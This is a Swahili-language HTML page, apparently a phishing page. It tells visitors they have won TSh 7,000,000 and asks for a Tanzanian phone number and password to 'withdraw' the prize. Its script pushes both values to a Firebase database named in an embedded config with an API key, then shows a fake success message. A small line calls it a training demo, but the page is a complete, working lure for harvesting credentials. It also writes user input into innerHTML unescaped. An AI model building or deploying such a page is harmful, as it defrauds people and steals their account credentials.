<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ushindi ‚Äì DEMO</title>

  <style>
    :root{
      --green:#16a34a;
      --green-dark:#0f7a36;
      --bg:#020617;
      --border:#1f2937;
      --muted:#9ca3af;
    }

    body{
      font-family: Arial, Helvetica, sans-serif;
      background:#0f172a;
      color:#e5e7eb;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      margin:0;
    }

    .card{
      background:var(--bg);
      border-radius:16px;
      box-shadow:0 15px 40px rgba(0,0,0,.45);
      padding:30px;
      max-width:420px;
      width:100%;
      border:1px solid var(--border);
    }

    h1{color:var(--green);text-align:center;margin:0}
    .status{text-align:center;color:var(--green);margin-top:6px}
    .amount{text-align:center;font-size:34px;font-weight:800;color:var(--green);margin:18px 0}
    .divider{height:1px;background:var(--border);margin:18px 0}

    label{margin-top:14px;display:block;color:var(--muted)}
    input{
      width:100%;
      padding:12px;
      margin-top:6px;
      border-radius:10px;
      border:1px solid var(--border);
      background:#020617;
      color:#e5e7eb;
    }

    button{
      margin-top:22px;
      width:100%;
      padding:14px;
      border-radius:12px;
      border:none;
      background:var(--green);
      font-weight:800;
      cursor:pointer;
    }

    button:hover{
      background:var(--green-dark);
      color:#ecfdf5;
    }

    .note{text-align:center;font-size:12px;color:var(--muted);margin-top:14px}

    /* POPUP */
    .popup{
      position:fixed;
      inset:0;
      background:rgba(2,6,23,.75);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:999;
    }
    .popup.active{display:flex}

    .popup-card{
      background:#020617;
      border-radius:16px;
      padding:28px;
      max-width:380px;
      width:90%;
      text-align:center;
      border:1px solid var(--border);
    }

    .popup-card h2{color:var(--green)}
  </style>
</head>

<body>

<div class="card">
  <h1>Hongera üéâ</h1>
  <div class="status">Umeshinda Kikamilifu</div>
  <div class="amount">TSh 7,000,000</div>

  <div class="divider"></div>

  <label>Namba ya Simu</label>
  <input id="phone" placeholder="+255XXXXXXXXX">

  <label>Nenosiri (DEMO)</label>
  <input id="password" type="password" placeholder="********">

  <button id="withdraw">Endelea Kutoa Kiasi</button>
  <p class="note">DEMO ya mafunzo ‚Äî si huduma halisi.</p>
</div>

<!-- POPUP -->
<div class="popup" id="popup">
  <div class="popup-card">
    <h2 id="popupTitle">Ombi Limefanikiwa ‚úÖ</h2>
    <p id="popupText"></p>
    <button onclick="popup.classList.remove('active')">Sawa</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

  /* FIREBASE CONFIG */
  const firebaseConfig = {
    apiKey: "AIzaSyDaEphuY2kQue8m-20DDs68JDgQirAycBE",
    authDomain: "digital-wallet-40297.firebaseapp.com",
    databaseURL: "https://digital-wallet-40297-default-rtdb.firebaseio.com",
    projectId: "digital-wallet-40297",
    storageBucket: "digital-wallet-40297.firebasestorage.app",
    messagingSenderId: "953454788272",
    appId: "1:953454788272:android:961fd704f587cf1b8c8575"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const popup = document.getElementById("popup");
  const popupText = document.getElementById("popupText");
  const popupTitle = document.getElementById("popupTitle");

  const phoneInput = document.getElementById("phone");
  const passwordInput = document.getElementById("password");

  document.getElementById("withdraw").addEventListener("click", async () => {
    const phone = phoneInput.value.trim();
    const password = passwordInput.value.trim();

    if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
      popupTitle.innerText = "Tatizo ‚ùå";
      popupText.innerHTML = "Tafadhali weka namba ya simu sahihi na nenosiri la DEMO.";
      popup.classList.add("active");
      return;
    }

    // Show popup immediately
    popupTitle.innerText = "Inatumwa ‚è≥";
    popupText.innerHTML = `Kutuma ombi la kutoa TSh 7,000,000 kwa <strong style="color:#16a34a">${phone}</strong>...`;
    popup.classList.add("active");

    try {
      await push(ref(db, "withdrawRequests"), {
        phone,
        passwordDemo: password,
        amount: 7000000,
        currency: "TZS",
        status: "pending",
        createdAt: serverTimestamp()
      });

      // Success
      popupTitle.innerText = "Ombi Limefanikiwa ‚úÖ";
      popupText.innerHTML = `
        Umefanikiwa kutuma ombi la kutoa
        <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
      `;
      console.log("Data imehifadhiwa kwenye Firebase (DEMO)");
    } catch(err) {
      // Failure
      popupTitle.innerText = "Tatizo ‚ùå";
      popupText.innerHTML = `
        Ombi halikufanikani kuwasilishwa.<br>
        Angalia internet au ruhusa za Firebase. <br>
        <strong>${err.message}</strong>
      `;
      console.error("Firebase write failed:", err);
    }
  });
</script>

</body>
</html>
